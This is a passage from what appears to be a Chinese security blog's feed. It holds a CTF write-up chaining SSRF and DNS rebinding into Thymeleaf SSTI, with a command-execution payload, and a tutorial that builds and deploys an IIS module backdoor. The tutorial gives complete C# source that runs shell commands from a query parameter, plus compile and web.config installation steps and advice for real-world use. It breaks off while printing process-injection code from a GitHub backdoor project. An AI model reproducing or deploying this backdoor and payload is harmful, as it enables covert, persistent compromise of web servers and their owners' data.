      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://y4er.com/posts/dotnet-deserialize-bypass-binder/#cve-2022-23277-of-exchange&quot;&gt;https://y4er.com/posts/dotnet-deserialize-b</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>2024红名谷-Java</title>
    <link href="https://ke1nys.github.io/posts/cb384e29.html"/>
    <id>https://ke1nys.github.io/posts/cb384e29.html</id>
    <published>2024-04-10T08:37:48.000Z</published>
    <updated>2024-04-18T12:57:04.525Z</updated>
    
    <content type="html"><![CDATA[<p><img src="../images/image-20240410191230916.png" alt="image-20240410191230916"></p><p>并不是打什么反序列化链子的操作  就是一个打<code>SSRF 302跳转/Dns重绑定</code>  然后ssti的一个操作</p><p><img src="../images/image-20240410193629155.png" alt="image-20240410193629155"></p><p>模板渲染的点  这里值如果可控的话就可以造成SSTI漏洞</p><p><img src="../images/image-20240410193809139.png" alt="image-20240410193809139"></p><p>刚在再AdminControl里面有个Process函数  并且这hostname可控 我们本地进行测试</p><p>写了个demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.example;</span><br><span class="line"></span><br><span class="line">import org.thymeleaf.TemplateEngine;</span><br><span class="line">import org.thymeleaf.context.Context;</span><br><span class="line">import org.thymeleaf.spring5.SpringTemplateEngine;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String hostname = &quot;&lt;a th:href=\&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;\&quot; th:title=&#x27;pepito&#x27;&gt;&quot;;</span><br><span class="line">        Context context = new Context();</span><br><span class="line">        TemplateEngine engine = new SpringTemplateEngine();</span><br><span class="line">        String dispaly = engine.process(hostname, context);</span><br><span class="line">        System.out.println(dispaly);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240410193920938.png" alt="image-20240410193920938"></p><p>能成功执行  那么说明了 只要我们传入我们恶意构造的hotsname参数 然后访问<code>getsites</code>路由 就能成功进入到这个模板渲染这了  </p><p><img src="../images/image-20240412201220592.png" alt="image-20240412201220592"></p><p><img src="../images/image-20240412201237283.png" alt="image-20240412201237283"></p><p>其实看到这的话  对DNS重绑定有印象的话 应该就能想到这用dns重绑定来打了  </p><p>看Curl这个路由发现</p><p><img src="../images/image-20240412201541908.png" alt="image-20240412201541908"></p><p><img src="../images/image-20240412201601591.png" alt="image-20240412201601591"></p><p>只要ip满足上述的这些if判断   就能进入到下面的<code>connect()</code>方法中  并且由于ttl为0  那么dns解释缓存的时间就为0  那么在第二次解析的时候  就会指向<code>127.0.0.1</code>  从而进入到<code>getsites</code>路由中</p><p><img src="../images/image-20240412201854270.png" alt="image-20240412201854270"></p><p>并且hoatname的值可控  然后302调转到<code>http://127.0.0.1/?hostname=exp</code>就行了</p><p>以后看到限制ip127.0.0.1的题目  可以考虑一下SSRF</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;../images/image-20240410191230916.png&quot; alt=&quot;image-20240410191230916&quot;&gt;&lt;/p&gt;
&lt;p&gt;并不是打什么反序列化链子的操作  就是一个打&lt;code&gt;SSRF 302跳转/Dns重绑定&lt;/cod</summary>
      
    
    
    
    
    <category term="Java" scheme="https://ke1nys.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-IIS后门</title>
    <link href="https://ke1nys.github.io/posts/cfd4005e.html"/>
    <id>https://ke1nys.github.io/posts/cfd4005e.html</id>
    <published>2024-04-04T07:35:07.000Z</published>
    <updated>2024-04-18T12:57:04.534Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://y4er.com/posts/using-csharp-to-develop-the-iis-module-backdoor/#%E5%8F%82%E8%80%83">https://y4er.com/posts/using-csharp-to-develop-the-iis-module-backdoor/#%E5%8F%82%E8%80%83</a></p><p><a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a></p><h2 id="iis后门的两种形式"><a href="#iis后门的两种形式" class="headerlink" title="iis后门的两种形式"></a>iis后门的两种形式</h2><p><a href="https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/developing-iis-modules-and-handlers-with-the-net-framework#two-ways-to-extend-iis-module-vs-handler">根据微软的文档</a>，iis开发功能分为两种，分别是<code>IIS module</code>和<code>IIS handler</code>，即IIS模块和IIS处理程序。</p><p>IIS模块是一个.NET类，该类实现ASP.NET<code>System.Web.IHttpModule</code>接口，并使用<code>System.Web</code>命名空间中的API参与一个或多个ASP.NET的请求处理阶段。</p><p>IIS处理程序也是一个类，该类实现ASP.NET<code>System.Web.IHttpHandler</code>或<code>System.Web.IHttpAsyncHandler</code>接口，并使用<code>System.Web</code>命名空间中的API为其支持的特定内容生成http响应。</p><p>IIS处理程序负责将请求提供给特定的url或特定扩展名，IIS模块则应用于基于任意规则的所有或某些请求。本文以IIS模块为例开发IIS后门实现从Cookie中获取cmd命令并执行。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>这里我用的是<code>Rider</code>和<code>.Net4.8.1</code>   项目的话直接用<code>ASP.NET Web</code>就行了  </p><p><img src="../images/image-20240404154346922.png" alt="image-20240404154346922"></p><p>环境这样起就算成功了</p><p><img src="../images/image-20240404154420580.png" alt="image-20240404154420580"></p><p>默认是加载这个Default.aspx</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两个接口分别负责模块的两个生命周期</p><ol><li>Init 模块初始化</li><li>Dispose 请求销毁</li></ol><p>Init()方法接受一个HttpApplication参数，此参数代表请求的上下文。其中HttpApplication中有一个订阅事件PreRequestHandlerExecute，<strong>该事件字面意思就是在请求之前进行处理。</strong></p><p><img src="../images/image-20240404155604801.png" alt="image-20240404155604801"></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.PreRequestHandlerExecute += <span class="keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do somthing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过new EventHandler()新建一个事件，我们新加事件时需要保证自己的方法和EventHandler方法签名一致。即传递<code>object sender, EventArgs e</code>两个参数，返回类型为void。</p><p>在<code>Context_PreRequestHandlerExecute</code>中，我们想干什么就干什么。</p><p><strong>(简单点说就是我们可以在Context_PreRequestHandlerExecute函数中写我们想要对传入的请求做任何操作)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private void Context_PreRequestHandlerExecute(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">    HttpApplication app = (HttpApplication)sender;</span><br><span class="line">    HttpRequest request = app.Context.Request;</span><br><span class="line">    HttpResponse response = app.Context.Response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过sender拿到HttpApplication上下文。有了request和response我们就可以拿到参数，执行命令拿到结果，然后写入response了。    </p><p><strong>(这个思路可以引申到内存马那了)</strong></p><p>接下来是一个简单的<code>iis_backdoor.cs</code>  实战的话不建议用这个简单的马   因为会把默认页面给替换掉  可以用上面的<a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a>  这个马  </p><p>或者自己改进一下也行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.PreRequestHandlerExecute += <span class="keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpApplication app = (HttpApplication)sender;</span><br><span class="line">            HttpRequest request = app.Context.Request;</span><br><span class="line">            HttpResponse response = app.Context.Response;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> cmd = request.QueryString.Get(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                Process proc = <span class="keyword">new</span> Process();</span><br><span class="line">                proc.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">                proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">                proc.Start();</span><br><span class="line">                proc.StandardInput.WriteLine(cmd);</span><br><span class="line">                proc.StandardInput.WriteLine(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">                <span class="built_in">string</span> outStr = proc.StandardOutput.ReadToEnd();</span><br><span class="line">                proc.Close();</span><br><span class="line">                response.Clear();</span><br><span class="line">                response.BufferOutput = <span class="literal">true</span>;</span><br><span class="line">                response.Write(outStr);</span><br><span class="line">                response.End();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception err)</span><br><span class="line">            &#123;</span><br><span class="line">                response.Write(err.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从参数中获取cmd，然后写入resp。编译dll之后来部署dll。</p><p>编译dll过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\csc.exe /target:library /out:IIS_BackDoor.dll IIS_BackDoor.cs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240404161010200.png" alt="image-20240404161010200"></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>在网站目录下写入web.config（<strong>如果已经有的话就在其基础上添加就行</strong>）</p><p><img src="../images/image-20240404161154904.png" alt="image-20240404161154904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.webServer&gt;</span><br><span class="line">    &lt;modules&gt;</span><br><span class="line">      &lt;add name=&quot;IIS_BackDoor&quot; type=&quot;IIS_BackDoor.MyModule&quot;/&gt;</span><br><span class="line">    &lt;/modules&gt;</span><br><span class="line">  &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//IIS_BackDoor是dll名字   MyModule是我们写的处理http请求的一个类</span><br></pre></td></tr></table></figure><p>然后将dll存入bin文件夹下就行了</p><p><img src="../images/image-20240404161349101.png" alt="image-20240404161349101"></p><p><img src="../images/image-20240404161419781.png" alt="image-20240404161419781"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\appcmd list site</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这个命令可以查看在iis这个服务器运行的所有网站（包括端口和文件地址）</span><br></pre></td></tr></table></figure><p>这里的话只是简单的理解一下  功能的话还是觉得是<a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a>  这个写的好点  但是都是5年前的东西了  感兴趣的可以进行修改一下  添加点功能上去</p><h2 id="分析github项目IIS-backdoor"><a href="#分析github项目IIS-backdoor" class="headerlink" title="分析github项目IIS_backdoor"></a>分析github项目IIS_backdoor</h2><p><a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a>  </p><p>直接clone下来导入到源码来进行查看</p><p><img src="../images/image-20240404164853731.png" alt="image-20240404164853731"></p><p>上面的是核心代码  下面的话是写的一个ui</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SecurityAttributes</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">public</span> Int32 Length = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpSecurityDescriptor = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> <span class="built_in">bool</span> bInheritHandle = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="title">SecurityAttributes</span>()</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">this</span>.Length = Marshal.SizeOf(<span class="keyword">this</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       [<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">struct</span> ProcessInformation</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hProcess;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hThread;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwProcessId;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwThreadId;</span><br><span class="line">       &#125;</span><br><span class="line">       [<span class="meta">Flags</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">enum</span> CreateProcessFlags : <span class="built_in">uint</span></span><br><span class="line">       &#123;</span><br><span class="line">           DEBUG_PROCESS = <span class="number">0x00000001</span>,</span><br><span class="line">           DEBUG_ONLY_THIS_PROCESS = <span class="number">0x00000002</span>,</span><br><span class="line">           CREATE_SUSPENDED = <span class="number">0x00000004</span>,</span><br><span class="line">           DETACHED_PROCESS = <span class="number">0x00000008</span>,</span><br><span class="line">           CREATE_NEW_CONSOLE = <span class="number">0x00000010</span>,</span><br><span class="line">           NORMAL_PRIORITY_CLASS = <span class="number">0x00000020</span>,</span><br><span class="line">           IDLE_PRIORITY_CLASS = <span class="number">0x00000040</span>,</span><br><span class="line">           HIGH_PRIORITY_CLASS = <span class="number">0x00000080</span>,</span><br><span class="line">           REALTIME_PRIORITY_CLASS = <span class="number">0x00000100</span>,</span><br><span class="line">           CREATE_NEW_PROCESS_GROUP = <span class="number">0x00000200</span>,</span><br><span class="line">           CREATE_UNICODE_ENVIRONMENT = <span class="number">0x00000400</span>,</span><br><span class="line">           CREATE_SEPARATE_WOW_VDM = <span class="number">0x00000800</span>,</span><br><span class="line">           CREATE_SHARED_WOW_VDM = <span class="number">0x00001000</span>,</span><br><span class="line">           CREATE_FORCEDOS = <span class="number">0x00002000</span>,</span><br><span class="line">           BELOW_NORMAL_PRIORITY_CLASS = <span class="number">0x00004000</span>,</span><br><span class="line">           ABOVE_NORMAL_PRIORITY_CLASS = <span class="number">0x00008000</span>,</span><br><span class="line">           INHERIT_PARENT_AFFINITY = <span class="number">0x00010000</span>,</span><br><span class="line">           INHERIT_CALLER_PRIORITY = <span class="number">0x00020000</span>,</span><br><span class="line">           CREATE_PROTECTED_PROCESS = <span class="number">0x00040000</span>,</span><br><span class="line">           EXTENDED_STARTUPINFO_PRESENT = <span class="number">0x00080000</span>,</span><br><span class="line">           PROCESS_MODE_BACKGROUND_BEGIN = <span class="number">0x00100000</span>,</span><br><span class="line">           PROCESS_MODE_BACKGROUND_END = <span class="number">0x00200000</span>,</span><br><span class="line">           CREATE_BREAKAWAY_FROM_JOB = <span class="number">0x01000000</span>,</span><br><span class="line">           CREATE_PRESERVE_CODE_AUTHZ_LEVEL = <span class="number">0x02000000</span>,</span><br><span class="line">           CREATE_DEFAULT_ERROR_MODE = <span class="number">0x04000000</span>,</span><br><span class="line">           CREATE_NO_WINDOW = <span class="number">0x08000000</span>,</span><br><span class="line">           PROFILE_USER = <span class="number">0x10000000</span>,</span><br><span class="line">           PROFILE_KERNEL = <span class="number">0x20000000</span>,</span><br><span class="line">           PROFILE_SERVER = <span class="number">0x40000000</span>,</span><br><span class="line">           CREATE_IGNORE_SYSTEM_DEFAULT = <span class="number">0x80000000</span>,</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">StartupInfo</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">public</span> Int32 cb = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpReserved = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpDesktop = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpTitle = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwX = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwY = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwXSize = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwYSize = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwXCountChars = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwYCountChars = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwFillAttribute = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwFlags = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int16 wShowWindow = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int16 cbReserved2 = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpReserved2 = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hStdInput = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hStdOutput = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hStdError = IntPtr.Zero;</span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="title">StartupInfo</span>()</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">this</span>.cb = Marshal.SizeOf(<span class="keyword">this</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateProcessA</span>(<span class="params">String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">               IntPtr lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">               String lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">               [In] StartupInfo lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">out</span> ProcessInformation lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">           </span>)</span>;</span><br><span class="line"></span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAllocEx</span>(<span class="params">IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">WriteProcessMemory</span>(<span class="params">IntPtr hProcess, IntPtr lpBaseAddress, <span class="built_in">byte</span>[] buffer, IntPtr dwSize, <span class="built_in">int</span> lpNumberOfBytesWritten</span>)</span>;</span><br><span class="line"></span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateRemoteThread</span>(<span class="params">IntPtr hProcess, IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span 